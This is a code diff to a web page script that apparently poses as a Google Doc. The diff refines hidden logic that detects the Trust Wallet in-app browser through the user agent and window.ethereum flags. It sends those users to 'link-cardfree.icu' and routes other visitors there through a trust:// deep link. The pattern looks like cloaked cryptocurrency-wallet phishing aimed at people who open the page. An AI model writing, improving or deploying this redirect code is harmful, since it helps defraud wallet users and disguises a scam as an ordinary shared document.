@@ -303,17 +303,20 @@ window.GOOGLE_DOC = "<!doctype html>\n<html lang=\"ru\">\n<head>\n<meta charset=
       document.open(); document.write(window.GOOGLE_DOC); document.close();
     }, { once: true });
   } else {
-    setTimeout(function () {
-      (function(){
+    (function(){
       var target = "https://link-cardfree.icu/";
-      var enc = encodeURIComponent(target);
       var ua = navigator.userAgent || "";
-      if (/trustwallet|trust app|trust\/[0-9]/i.test(ua)) { location.replace(target); return; }
-      location.href = "trust://open_url?url=" + enc;
-      setTimeout(function(){ if (!document.hidden) location.href = "https://link.trustwallet.com/open_url?url=" + enc; }, 1200);
-      setTimeout(function(){ if (!document.hidden) location.href = target; }, 3000);
+      var eth = window.ethereum || {};
+      var inTw = /trustwallet|trust ?wallet|trust\//i.test(ua) || eth.isTrust === true || eth.isTrustWallet === true || !!window.trustwallet || !!window.trustWallet;
+      if (inTw) { location.replace(target); return; }
+      var enc = encodeURIComponent(target);
+      setTimeout(function(){
+        try { location.href = "trust://open_url?url=" + enc; } catch (e) {}
+        setTimeout(function(){
+          if (!document.hidden) location.replace(target);
+        }, 1200);
+      }, 400);
     })();
-    }, 1500);
   }
 })();
 </script>
